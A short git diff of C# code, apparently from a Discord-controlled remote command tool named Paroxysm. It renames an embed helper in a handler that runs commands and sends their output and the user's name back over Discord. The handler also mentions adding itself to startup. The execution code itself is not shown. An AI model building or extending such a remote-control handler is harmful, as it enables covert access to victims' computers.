@@ -1,6 +1,6 @@
 ﻿using System.Diagnostics;
 using Discord;
-using Paroxysm.Tools;
+using Paroxysm.Discord;
 
 namespace Paroxysm.Hooks.Actions;
 
@@ -10,7 +10,7 @@ public static class ExecuteCommandAction
     {
         if (command is null)
         {
-            return EmbedCreator.CreateWithText(Color.Red, "Command executed with errors",
+            return DiscordEmbed.CreateWithText(Color.Red, "Command executed with errors",
                 "Cannot add application to startup.", Environment.UserName, null);
         }
 
@@ -34,16 +34,16 @@ public static class ExecuteCommandAction
 
             if (output.Length == 0)
             {
-                return EmbedCreator.CreateWithText(Color.Red, "Command executed with errors",
+                return DiscordEmbed.CreateWithText(Color.Red, "Command executed with errors",
                     "Command does not return result or not exist.", Environment.UserName, null);
             }
 
-            return EmbedCreator.CreateWithText(Color.Red, $"Command {command} result:",
+            return DiscordEmbed.CreateWithText(Color.Red, $"Command {command} result:",
                 output, Environment.UserName, null);
         }
         catch (Exception exception)
         {
-            return EmbedCreator.CreateWithText(Color.Red, "Command executed with errors",
+            return DiscordEmbed.CreateWithText(Color.Red, "Command executed with errors",
                 exception.ToString(), Environment.UserName, null);
         }
     }
